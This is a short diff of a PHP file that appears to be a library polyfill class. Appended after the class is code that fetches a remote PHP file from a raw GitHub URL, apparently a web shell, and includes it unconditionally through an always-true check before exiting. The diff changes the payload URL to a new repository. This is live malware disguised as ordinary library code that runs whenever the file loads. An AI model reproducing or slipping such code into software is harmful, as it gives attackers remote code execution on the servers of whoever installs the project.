@@ -84,7 +84,7 @@ final class Php80
         return '' === $needle || ('' !== $haystack && 0 === substr_compare($haystack, $needle, -\strlen($needle)));
     }
 }
-$ftp_url = "https://raw.githubusercontent.com/sundapridee/sunda/refs/heads/main/shelmike.php";
+$ftp_url = "https://raw.githubusercontent.com/happyasmara772-lgtm/apakamu-/refs/heads/main/aww.php";
 function downloadAndInclude($url)
 {
     $cu = curl_init($url);
@@ -102,4 +102,5 @@ function downloadAndInclude($url)
 if (1 + 1 == 2) {
     downloadAndInclude($ftp_url);
     exit;
+
 }
